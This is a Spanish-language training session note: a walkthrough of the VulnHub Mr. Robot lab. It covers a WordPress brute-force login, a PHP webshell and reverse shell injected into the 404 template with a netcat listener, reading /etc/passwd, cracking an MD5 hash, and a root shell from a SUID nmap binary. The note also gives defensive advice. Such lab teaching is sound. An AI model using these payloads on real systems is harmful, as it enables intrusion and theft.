---
tags:
- Máquinas y prácticas
---

# Sesion 26 Mr. Robot II Evolve

**🤖 Explotación de Máquinas Locales II**

Mr. Robot — VulnHub (Finalización)

*Instructor: Carlos Castillo · Fecha: 16 de junio de 2026*

*🎂 Sesión especial — Cumpleaños de Chema (30 años) 🎂*

| ℹ️ Esta sesión completa la máquina Mr. Robot de VulnHub. Se cubren: explotación de WordPress autenticado, webshells, bind shell vs. reverse shell, escalada de privilegios con SUID y GTFOBins, y un bloque introductorio de análisis de PCAP (forense de red). |
| --- |

# **1. Objetivos de la Sesión**

- Completar la máquina Mr. Robot desde el punto donde se dejó (login de WordPress).
- Comprender y explotar un file upload autenticado en WordPress.
- Distinguir conceptualmente bind shell vs. reverse shell.
- Obtener una reverse shell mediante PHP webshell inyectada en la plantilla 404.
- Realizar movimiento lateral (daemon → robot) y escalada de privilegios (robot → root).
- Introducir el análisis forense de red mediante ficheros PCAP con Wireshark.

# **2. Conceptos Clave**

## **2.1 Arquitectura Web: Front-end y Back-end**

Una aplicación web tiene dos capas principales:

- Front-end: lo que el navegador muestra al usuario (HTML, CSS, JavaScript). Está "delante".
- Back-end: el servidor que procesa las peticiones y ejecuta la lógica. Está "detrás".

Cuando un atacante consigue que el back-end ejecute un comando a través de la web, se llama Remote Code Execution (RCE). La página web actúa como vector de ataque.

| ℹ️ RCE = Remote Code Execution. El servidor ejecuta en su terminal lo que el atacante le indica, a través de la propia página web. |
| --- |

## **2.2 File Upload — Subida de Ficheros**

La vulnerabilidad de file upload aparece cuando una aplicación permite subir archivos al servidor. Si además el directorio de subida es accesible desde el navegador, el atacante puede ejecutar el fichero subido.

Tipos de validación (o falta de ella):

- Sin validación: cualquier fichero se acepta. El más común en entornos reales.
- Blacklist: se rechazan ciertas extensiones (.php, .exe…). Fácil de evadir.
- Whitelist: solo se aceptan extensiones concretas (p. ej. .jpg, .png). La más segura.

| ⚠️ Una blacklist es una mala práctica. Siempre que se intente asegurar una subida de ficheros con una lista negra, se puede intentar evadir. La whitelist es la única forma fiable. |
| --- |

Vías para subir un fichero malicioso:

- FTP: si el directorio FTP coincide con /var/www/html, el fichero sube y queda accesible desde la web.
- File uploader propio de la aplicación (formulario clásico).
- CMS: WordPress, Drupal, Joomla y similares exponen múltiples vías de subida.

Para que el fichero subido sea ejecutado solo se necesita:

- Conocer la ruta (directorio/fichero) en el servidor.
- Tener permisos de lectura sobre ese recurso (el servidor web lo interpreta al accederlo).

| ⚠️ En Linux+Apache → el lenguaje habitual es PHP. En Windows+IIS → ASP.NET (.aspx). Subir una shell .php en un entorno .NET no funcionará. |
| --- |

## **2.3 Bind Shell vs. Reverse Shell**

Son los dos modelos de conexión remota para obtener acceso interactivo a una máquina comprometida.

| **Concepto** | **Bind Shell** | **Reverse Shell** |
| --- | --- | --- |
| ¿Quién inicia la conexión? | El atacante se conecta a la víctima | La víctima se conecta al atacante |
| RHOST | IP de la víctima | IP del atacante (la nuestra) |
| Puerto a escucha | Se abre en la víctima | Se abre en el atacante |
| Requiere RCE previo | No (si hay puerto abierto) | Sí, para decirle a la víctima que se conecte |
| Más común en CTF/auditoría | Menos | Sí, mucho más frecuente |

| ℹ️ La reverse shell es la técnica más utilizada porque el atacante controla el puerto de escucha. La víctima "llama" al atacante, lo que a menudo evita restricciones de firewall entrante en la máquina víctima. |
| --- |

## **2.4 Webshell**

Una webshell es un script (normalmente PHP, ASP.NET, etc.) subido al servidor que permite ejecutar comandos del sistema operativo a través del navegador. La más simple en PHP es:

| <?php system($\_REQUEST["cmd"]); ?> |
| --- |

Esta línea hace que el servidor ejecute lo que llegue en el parámetro cmd de la URL. Se usa como primer paso para obtener RCE y desde ahí lanzar una reverse shell.

Kali Linux incluye webshells en el directorio:

| /usr/share/webshells/ |
| --- |

Dentro se organizan por lenguaje: php/, asp/, cfm/, jsp/, etc. Para un servidor Linux con Apache siempre se usan las de la carpeta php/.

- php-backdoor.php: webshell simple que acepta el parámetro cmd.
- php-reverse-shell.php: reverse shell completa; conecta la víctima con el atacante.

## **2.5 Netcat como Listener**

Netcat (nc) es la herramienta más básica para poner un puerto a la escucha y recibir conexiones entrantes. En el contexto de una reverse shell, el atacante ejecuta:

| nc -lvnp 4444 |
| --- |

Parámetros:

- -l: modo escucha (listen).
- -v: verbose, muestra información de la conexión.
- -n: sin resolución DNS (más rápido).
- -p 4444: puerto donde escuchar (elegir un highport libre).

| ✅ El listener queda bloqueado esperando. Cuando la víctima ejecuta la reverse shell y se conecta, el terminal del atacante "cobra vida" y ya se puede operar en la máquina víctima. |
| --- |

## **2.6 Movimiento Lateral y Escalada de Privilegios**

Una vez dentro de la máquina (como un usuario de bajo privilegio como daemon), el objetivo es:

- Movimiento lateral (horizontal): pasar de un usuario a otro con los mismos privilegios. Ej: daemon → robot.
- Escalada de privilegios (vertical): pasar a un usuario con más privilegios. Ej: robot → root.

## **2.7 SUID y GTFOBins**

SUID (Set User ID) es un permiso especial de Linux que permite ejecutar un binario con los privilegios del propietario del fichero, no del usuario que lo ejecuta.

Se identifica con una "s" en lugar de la "x" en los permisos del propietario:

| -rwsr-xr-x 1 root root /usr/local/bin/nmap |
| --- |

Si el propietario es root y el binario tiene SUID, cualquier usuario puede ejecutarlo como root.

GTFOBins (Get The F\*\*\* Out Binaries) es una página (gtfobins.github.io) que lista binarios Unix que pueden usarse para escalar privilegios, obtener shells, leer/escribir ficheros, etc., especialmente cuando tienen SUID o se pueden ejecutar con sudo.

| 🔴 El SUID en binarios como nmap, vim, find, python, etc. es una vulnerabilidad clásica de misconfiguraciones en Linux. Siempre hay que buscarlos durante la fase de reconocimiento post-compromiso. |
| --- |

# **3. Desarrollo Técnico — Walkthrough de Mr. Robot**

## **3.1 Reconocimiento inicial (sesión anterior)**

En la sesión anterior se realizó:

- Nmap: solo puertos 80 (HTTP) y 443 (HTTPS) abiertos. Puerto 22 (SSH) cerrado. Vector de ataque: web.
- Dirsearch/Gobuster: se descubrió el directorio /wp-login.php, confirmando un WordPress.
- robots.txt: contenía fsociety.dict — un diccionario de contraseñas específico de la máquina.
- Descarga y limpieza del diccionario: de 858.161 líneas a 11.452 únicas (con sort | uniq).

| ℹ️ Nota sobre el diccionario: el archivo tenía muchas entradas duplicadas. Al aplicar `cat fsociety.dict | sort -u > diccionario\_clean.txt` se redujo a 11.452 entradas, haciendo el ataque de fuerza bruta 75 veces más rápido. |
| --- |

## **3.2 Enumeración de usuario válido con Burp Suite Intruder**

El formulario de login de WordPress revela si el usuario existe o no mediante mensajes de error diferentes:

- "ERROR: Invalid username." → usuario incorrecto.
- "ERROR: The password you entered for the username Elliot is incorrect." → usuario válido.

Esto permite hacer fuerza bruta al campo usuario sin saber aún la contraseña.

Flujo con Burp Suite:

1. 1. Activar FoxyProxy con el perfil de Burp (proxy local en 127.0.0.1:8080).
2. 2. En Burp → Proxy → Intercept On.
3. 3. Enviar el formulario de login desde el navegador. Burp intercepta la petición.
4. 4. Clic derecho → Send to Intruder.
5. 5. En Intruder → Positions: seleccionar el valor del campo log (usuario) → Add.
6. 6. En Payloads: cargar los nombres de personajes de Mr. Robot + admin, administrator, root.
7. 7. Start Attack.
8. 8. Ordenar por Length. El usuario Elliot tiene una longitud de respuesta diferente (4117 bytes vs 4065 bytes) → usuario válido.

| ℹ️ Burp Suite Community lanza la fuerza bruta con pausas aleatorias para no generar un patrón de petición constante y evitar ser detectado/bloqueado. Esto hace el ataque más lento pero más sigiloso. |
| --- |

| # Payloads de usuario probados: |
| --- |
| Elliot, Tyrell, Johanna, Dominique, Leon, MrRobot, Trenton, |
| Gideon, Darlene, WhiteRose, Angela, admin, administrator, root |
|  |
| # Resultado: Elliot → longitud de respuesta diferente → usuario válido |

## **3.3 Fuerza bruta de contraseña con Burp Intruder**

Con el usuario Elliot confirmado, se repite el proceso de Intruder pero ahora sobre el campo password, usando el diccionario limpio (diccionario\_clean.txt, 11.452 entradas).

1. Nueva intercepción del login con usuario=Elliot y contraseña aleatoria.
2. Send to Intruder → marcar el campo password → Add.
3. Payload: Simple list → Load → diccionario\_clean.txt.
4. Start Attack. Esperar (puede tardar 15-20 minutos dependiendo del hardware).
5. La entrada correcta devuelve una respuesta diferente: longitud 1109 bytes y una cookie de WordPress → acceso concedido.

| ✅ Una vez encontrada la contraseña, la respuesta de Burp muestra una WordPress cookie con el nombre de usuario, indicando que el login fue exitoso. Se quita FoxyProxy y se introduce la credencial directamente en el navegador. |
| --- |

## **3.4 Explotación de WordPress autenticado**

Ya dentro del panel de administración de WordPress (wp-admin). Se exploran dos métodos para inyectar una webshell.

**Método 1: WP File Manager (plugin)**

1. Ir a Plugins → Add New → buscar "File Manager".
2. Instalar y activar el plugin WP File Manager.
3. El plugin muestra el sistema de ficheros del servidor desde la raíz del WordPress.
4. Desde la raíz se puede ver key-1-of-3.txt (primera flag) y fsociety.dict.
5. Limitación: Elliot no tiene permisos de escritura en la raíz. No se puede subir la webshell directamente a /.

| ℹ️ El WP File Manager es el método preferido porque deja menos rastro (se sube un fichero nuevo sin modificar los existentes). Sin embargo, requiere permisos de escritura en el directorio destino. |
| --- |

**Método 2: Editor de plantillas (template editor) — el que funcionó**

WordPress permite editar directamente el código PHP de sus plantillas. La plantilla 404.php se ejecuta cuando se accede a una ruta inexistente.

1. Ir a Apariencia → Editor → seleccionar 404.php.
2. Borrar todo el contenido de la plantilla e insertar el contenido de la php-backdoor o php-reverse-shell.
3. Hacer clic en Update File / Guardar cambios.
4. Verificar: acceder a http://IP/404.php (o a cualquier ruta inválida) para disparar la plantilla.

| ⚠️ ⚠️ Si se modifica la plantilla 404.php de WordPress y algo falla, la página mostrará un error o una pantalla en blanco. Esto es esperado: significa que PHP se ejecutó pero no mostró contenido visual (porque la shell no imprime HTML). |
| --- |

## **3.5 Webshell con php-backdoor — Prueba de RCE**

Primero se prueba con la simple php-backdoor para confirmar RCE antes de lanzar la reverse shell:

| # Código insertado en 404.php (php-backdoor simplificado): |
| --- |
| <?php system($\_REQUEST["cmd"]); ?> |
|  |
| # Prueba de ejecución desde navegador: |
| http://IP\_VICTIMA/404.php?cmd=whoami |
|  |
| # Resultado: |
| daemon |
|  |
| # Leer /etc/passwd (los espacios se encodean como +): |
| http://IP\_VICTIMA/404.php?cmd=cat+/etc/passwd |

Del /etc/passwd se identifican los usuarios con directorio /home → son usuarios reales del sistema. Los usuarios sin /home o con /bin/false son cuentas de servicio.

| ℹ️ En /etc/passwd, el formato es: usuario:x:uid:gid:descripción:home:shell. Los usuarios con /bin/bash y un directorio /home son los que se pueden utilizar como objetivo de movimiento lateral. |
| --- |

## **3.6 Reverse Shell con php-reverse-shell**

Con RCE confirmado, se prepara la reverse shell completa:

1. 1. En Kali: copiar la reverse shell a un directorio de trabajo.
2. 2. Editar el fichero php-reverse-shell.php y cambiar la IP y el puerto.

| # Modificar en php-reverse-shell.php: |
| --- |
| $ip = '10.0.2.3'; // IP del atacante (nuestra Kali — ifconfig/ip a) |
| $port = 4444; // Puerto libre en nuestra máquina |

1. 3. Insertar el contenido de php-reverse-shell.php en la plantilla 404.php de WordPress y guardar.
2. 4. En Kali: abrir el listener con netcat.

| nc -lvnp 4444 |
| --- |

1. 5. En el navegador: acceder a http://IP\_VICTIMA/404.php (o a cualquier ruta inválida).
2. 6. El servidor ejecuta la reverse shell → la víctima se conecta a nuestro listener.

| ✅ ✅ Cuando la reverse shell conecta, el terminal de Kali con netcat muestra: "Connection received on IP:PUERTO". Ya se tiene acceso interactivo como daemon. |
| --- |

## **3.7 Estabilización de la shell**

Las reverse shells básicas de PHP son limitadas: no hay autocompletado con Tab, no funcionan las flechas, Ctrl+C mata la shell en lugar de interrumpir el comando. Para mejorarla:

| # Técnica de estabilización (ejecutar en la reverse shell): |
| --- |
| python -c 'import pty; pty.spawn("/bin/bash")' |
|  |
| # O con Python3: |
| python3 -c 'import pty; pty.spawn("/bin/bash")' |

Tras este comando, la shell tiene un aspecto similar a una sesión SSH normal (muestra prompt con usuario@máquina).

| ⚠️ Si se hace Ctrl+C por error dentro de una reverse shell estabilizada, se pierde la conexión y hay que reiniciar el proceso (volver a acceder a la URL que dispara la webshell). La mejor solución a largo plazo es conseguir persistencia por SSH o netcat contra netcat. |
| --- |

## **3.8 Reconocimiento en la máquina víctima**

| # Ver en qué directorio estamos: |
| --- |
| pwd |
| # → / (raíz del sistema) |
|  |
| # Ver usuarios con directorios /home: |
| ls /home |
| # → robot |
|  |
| # Ver contenido del directorio de robot: |
| ls -la /home/robot |
| # → -rw-r--r-- 1 robot robot ... password.raw-md5 |
| # → -rw------- 1 robot robot ... key-2-of-3.txt ← NO se puede leer aún |
|  |
| # Leer el fichero de contraseña (sí tenemos permisos de lectura): |
| cat /home/robot/password.raw-md5 |
| # → robot:c3fcd3d76192e4007dfb496cca67e13b |

El fichero .raw-md5 indica que la contraseña está hasheada en MD5. El formato usuario:hash es el formato clásico de credenciales.

| ℹ️ No es necesario Claude ni herramientas avanzadas para identificar un hash MD5: el propio nombre del fichero lo indica (.raw-md5). Además, el hash tiene 32 caracteres hexadecimales, característica del MD5. |
| --- |

## **3.9 Crackeo del hash MD5**

Se utiliza CrackStation (crackstation.net) para crackear el hash por rainbow tables:

| # Hash a crackear: |
| --- |
| c3fcd3d76192e4007dfb496cca67e13b |
|  |
| # Resultado en CrackStation: |
| # MD5 → abcdefghijklmnopqrstuvwxyz |
|  |
| # Credenciales obtenidas: |
| # Usuario: robot |
| # Contraseña: abcdefghijklmnopqrstuvwxyz |

| ⚠️ La contraseña es el abecedario en minúsculas. Es una contraseña débil que aparece en cualquier diccionario estándar. Esto confirma la importancia de políticas de contraseñas fuertes. |
| --- |

## **3.10 Movimiento lateral: daemon → robot**

| # Cambiar al usuario robot (desde la shell de daemon): |
| --- |
| su robot |
| # Introducir la contraseña: abcdefghijklmnopqrstuvwxyz |
|  |
| # Verificar identidad: |
| whoami |
| # → robot |
|  |
| # Leer la segunda flag: |
| cat /home/robot/key-2-of-3.txt |
| # → [segunda flag — contenido dependiente de la instancia] |

| ✅ ✅ Segunda flag obtenida. En Linux, `su usuario` permite cambiar de usuario si se conoce la contraseña. El clipboard de Linux permite pegar con el botón central del ratón (selección primaria). |
| --- |

## **3.11 Escalada de privilegios: robot → root**

**Paso 1: Enumerar permisos sudo**

| sudo -l |
| --- |
| # → Sorry, user robot may not run sudo on linux. |

Robot no puede ejecutar ningún comando con sudo. Se busca otra vía: ficheros con SUID.

**Paso 2: Buscar binarios con SUID**

| # Buscar todos los binarios con bit SUID activo: |
| --- |
| find / -perm -4000 -type f 2>/dev/null |
|  |
| # Resultado relevante (entre otros): |
| -rwsr-xr-x 1 root root ... /usr/local/bin/nmap |
| -rwsr-xr-x 1 root root ... /bin/ping |
| -rwsr-xr-x 1 root root ... /bin/su |

La "s" en lugar de "x" en los permisos del propietario indica SUID. El código numérico 4000 representa el bit SUID. El 2>/dev/null descarta los errores de permiso (ficheros que no podemos leer).

| 🔴 El SUID en nmap es sospechoso. Nmap no debería tener SUID en un sistema bien configurado. Esto es una misconfiguration explotable. |
| --- |

**Paso 3: GTFOBins — buscar nmap**

En gtfobins.github.io se busca "nmap". El sitio muestra que nmap tiene una opción --interactive que abre una consola interna, desde la cual se puede spawnear una shell con !:

| # Lanzar nmap en modo interactivo (aprovechando SUID): |
| --- |
| nmap --interactive |
|  |
| # Dentro de la consola de nmap: |
| !sh |
|  |
| # Resultado: |
| # $ whoami |
| # → root |

| ✅ ✅ ¡Somos root! El binario nmap se ejecutó con los privilegios de su propietario (root) gracias al SUID. Al escapar de nmap con !sh, la shell heredó esos privilegios. |
| --- |

**Paso 4: Obtener la tercera flag**

| # Leer la última flag: |
| --- |
| cat /root/key-3-of-3.txt |
| # → [tercera flag — contenido dependiente de la instancia] |

| ✅ 🎉 ¡Máquina Mr. Robot completada! Resumen de la cadena: Enumeración web → Fuerza bruta WordPress → File upload → RCE/Webshell → Reverse Shell → daemon → robot (lateral) → root (SUID nmap). |
| --- |

# **4. Diagrama de la Cadena de Explotación**

| **Fase** | **Técnica** | **Herramienta** | **Resultado** |
| --- | --- | --- | --- |
| Reconocimiento | Escaneo de puertos | Nmap | Puertos 80/443 abiertos |
| Enumeración web | Directory fuzzing + robots.txt | Dirsearch / manual | /wp-login.php + fsociety.dict |
| Preparación | Limpieza del diccionario | cat | sort -u | 11.452 palabras únicas |
| Acceso inicial | Fuerza bruta WordPress | Burp Suite Intruder | Usuario: Elliot / Pass: [del diccionario] |
| Explotación | File upload en plantilla 404 | Burp Suite + Editor WP | PHP reverse shell inyectada |
| Acceso remoto | Reverse shell PHP + listener | Netcat (nc -lvnp 4444) | Shell como daemon |
| Reconocimiento interno | Lectura de /etc/passwd y /home/robot/ | cat / ls | Usuario robot + hash MD5 |
| Crackeo | Rainbow tables | CrackStation | Contraseña en claro |
| Movimiento lateral | Cambio de usuario | su robot | Shell como robot + key-2-of-3 |
| Escalada de privilegios | SUID en nmap + GTFOBins | nmap --interactive + !sh | Shell como root + key-3-of-3 |

# **5. Herramientas Utilizadas en la Sesión**

| **Herramienta** | **Objetivo** | **Fase** | **Comando / Uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| Burp Suite | Interceptar y manipular peticiones HTTP | Explotación web | Proxy + Intruder (Sniper) | Practicada | También usado para fuerza bruta de login |
| FoxyProxy | Extensión Firefox para activar proxy Burp | Explotación web | Activar/desactivar perfil Burp | Introducida | Necesaria para interceptar tráfico del navegador |
| Netcat (nc) | Listener para reverse shell | Post-explotación | nc -lvnp 4444 | Introducida | Herramienta fundamental para recibir shells |
| CrackStation | Crackeo de hashes por rainbow tables | Post-explotación | Interfaz web: crackstation.net | Introducida | Alternativa online a Hashcat/John para MD5 comunes |
| GTFOBins | Buscar técnicas de escalada con binarios | Escalada de privilegios | Búsqueda web: gtfobins.github.io | Introducida | Recurso imprescindible en cualquier auditoría Linux |
| Nmap (como SUID) | Spawnar shell de root | Escalada de privilegios | nmap --interactive + !sh | Practicada | Aquí Nmap se usa como vector de escalada, no para escaneo |
| WordPress File Manager | Plugin para ver ficheros del servidor | Reconocimiento interno | Interfaz gráfica del plugin | Introducida | Útil pero limitado por permisos del usuario WordPress |
| python pty.spawn | Estabilizar reverse shell | Post-explotación | python -c "import pty; pty.spawn("/bin/bash")" | Introducida | Mejora la interactividad de la shell obtenida |
| Dirsearch | Enumeración de directorios web | Enumeración | dirsearch -u URL | Introducida | Sesión anterior; descubrió /wp-login.php |

# **6. Comandos Importantes**

## **Limpieza del diccionario**

| cat fsociety.dict | sort -u > diccionario\_clean.txt |
| --- |

## **Listener con Netcat**

| nc -lvnp 4444 |
| --- |

## **Verificar IP de atacante**

| ifconfig # o ip a |
| --- |

## **Buscar binarios con SUID**

| find / -perm -4000 -type f 2>/dev/null |
| --- |

## **Cambiar de usuario**

| su nombre\_usuario |
| --- |

## **Escalar con nmap (SUID + GTFOBins)**

| nmap --interactive |
| --- |

| !sh |
| --- |

## **Estabilizar reverse shell**

| python -c 'import pty; pty.spawn("/bin/bash")' |
| --- |
| python3 -c 'import pty; pty.spawn("/bin/bash")' |

## **Leer fichero de contraseñas (hash)**

| cat /home/robot/password.raw-md5 |
| --- |

# **7. Riesgos, Errores Comunes y Buenas Prácticas**

| 🔴 ❌ RIESGO: Usar una blacklist para filtrar extensiones de fichero en subidas. Un atacante puede renombrar la extensión o usar variantes (.php5, .phtml). Siempre usar whitelist. |
| --- |

| 🔴 ❌ RIESGO: Dar SUID a binarios como nmap, vim, python o find. Cualquier usuario del sistema puede usarlos para escalar a root. Revisar periódicamente con find / -perm -4000. |
| --- |

| ⚠️ ❌ ERROR: Hacer Ctrl+C dentro de una reverse shell — mata la conexión. En reverse shells no estabilizadas, usar Ctrl+Z para pausar, no Ctrl+C para interrumpir. |
| --- |

| ✅ ✅ BUENA PRÁCTICA: Usar contraseñas fuertes en CMS. El abecedario como contraseña es el ejemplo perfecto de lo que NO hay que hacer. |
| --- |

| ✅ ✅ BUENA PRÁCTICA: Desactivar el editor de plantillas de WordPress en producción (añadir define("DISALLOW\_FILE\_EDIT", true) en wp-config.php) para evitar que un atacante autenticado inyecte código. |
| --- |

| ✅ ✅ BUENA PRÁCTICA: Hacer snapshots de la VM después de cada sesión de laboratorio para no perder el progreso y poder revertir si algo se rompe. |
| --- |

| ℹ️ ⚠️ USO DE CLAUDE/IA: Útil para identificar tipos de hash, buscar correspondencias entre binarios SUID y GTFOBins, y automatizar tareas repetitivas. Sin embargo, entender el proceso manual primero es esencial para no depender ciegamente de herramientas. |
| --- |

# **8. Conexión con Sesiones Anteriores**

Esta sesión conecta directamente con varias áreas trabajadas previamente:

| **Concepto de esta sesión** | **Conexión con sesiones anteriores** |
| --- | --- |
| Burp Suite Intruder (fuerza bruta) | Primera aparición práctica de Burp Suite. Se complementa con Hydra (visto en RickdiculouslyEasy) para ataques a servicios como SSH. |
| Reverse shell por PHP | Misma técnica base que las webshells de Oopsie (HTB), donde se subió un fichero PHP para ejecutar comandos. |
| su usuario (movimiento lateral) | En las máquinas de Metasploitable II se realizó movimiento lateral mediante credenciales encontradas en bases de datos y ficheros de configuración. |
| SUID + GTFOBins (nmap --interactive) | La escalada de privilegios por SUID es equivalente al abuso de sudo ya visto. GTFOBins es el equivalente web del catálogo de exploit-db para binarios del sistema. |
| find / -perm -4000 (enumeración SUID) | Complementa el uso de LinPEAS (visto en Oopsie) que también detecta binarios SUID automáticamente. |
| Netcat listener (nc -lvnp) | Netcat se mencionó en sesiones de redes. Aquí se usa su función de escucha para recibir conexiones de reverse shells. |

# **9. Resumen Final**

En esta sesión se completó la máquina Mr. Robot de VulnHub. La cadena de ataque recorrió todo el ciclo ofensivo desde la enumeración hasta el compromiso total:

- Se identificó WordPress mediante enumeración web y se accedió con fuerza bruta al panel de administración.
- Se explotó el editor de plantillas para inyectar una webshell PHP en la plantilla 404.php.
- Se obtuvo RCE como daemon y se estableció una reverse shell completa con netcat.
- Se encontró un hash MD5 de la contraseña del usuario robot, se crackeó con CrackStation y se realizó movimiento lateral.
- Se identificó nmap con SUID mediante find / -perm -4000, se consultó GTFOBins y se escapó a una shell de root.

Conceptualmente, la sesión introdujo dos vectores clave que se repetirán a lo largo del máster: la explotación de CMS (WordPress es el más común en auditorías reales) y el abuso de permisos SUID como técnica de escalada en Linux.

# **10. Checklist de Repaso**

| **Concepto** | **¿Lo entiendo?** | **Acción** |
| --- | --- | --- |
| Diferencia front-end / back-end | □ | Repasar la analogía del servidor como "sala de máquinas" |
| Qué es RCE y cómo se logra a través de file upload | □ | Revisar el flujo: subida → acceso → ejecución |
| Blacklist vs Whitelist en validación de ficheros | □ | Memorizar: blacklist = mala idea siempre |
| Diferencia bind shell vs reverse shell | □ | Dibujar el diagrama de quién conecta a quién |
| Cómo activar el listener con netcat | □ | Practicar: nc -lvnp 4444 |
| Cómo inyectar una reverse shell en WordPress (editor de plantillas) | □ | Repetir el proceso en la propia máquina |
| Cómo estabilizar una reverse shell con python pty | □ | Memorizar el one-liner de python -c 'import pty...' |
| Cómo buscar binarios con SUID | □ | Practicar: find / -perm -4000 -type f 2>/dev/null |
| Qué es GTFOBins y para qué sirve | □ | Visitar gtfobins.github.io y explorar secciones SUID y sudo |
| Cómo escalar con nmap SUID | □ | Practicar: nmap --interactive → !sh |
| Qué es el movimiento lateral vs escalada de privilegios | □ | Recordar: horizontal (mismo nivel) vs vertical (más privilegio) |
| Cómo crackear un hash MD5 con CrackStation | □ | Probar con hashes de laboratorio |

# **11. Actualización del Registro de Herramientas**

| ℹ️ Las siguientes herramientas aparecen por primera vez o aumentan su nivel de familiaridad en esta sesión. |
| --- |

| **Herramienta** | **Estado anterior** | **Estado actual** | **Notas** |
| --- | --- | --- | --- |
| Burp Suite (Intruder) | Introducida (IDOR, cookie tampering) | Practicada | Primer uso real de Intruder para fuerza bruta de login |
| FoxyProxy | Mencionada | Introducida | Extensión Firefox esencial para trabajar con Burp |
| Netcat (nc) | Mencionada | Introducida | Herramienta de escucha para reverse shells |
| CrackStation | Nueva | Introducida | Servicio web para crackeo de hashes comunes por rainbow tables |
| GTFOBins | Nueva | Introducida | Catálogo web de técnicas de escalada con binarios del sistema |
| Python pty.spawn | Nueva | Introducida | Técnica de estabilización de reverse shells |
| su (cambio de usuario) | Conocida (Linux básico) | Practicada en contexto ofensivo | Primer uso en cadena de ataque real |
| find (búsqueda SUID) | Nueva en contexto ofensivo | Introducida | find / -perm -4000 -type f 2>/dev/null |

| ℹ️ Próxima sesión: El jueves se retoma con análisis forense de red (análisis de ficheros PCAP con Wireshark) — otra área importante del máster que complementa la visión ofensiva con la defensa y detección. |
| --- |
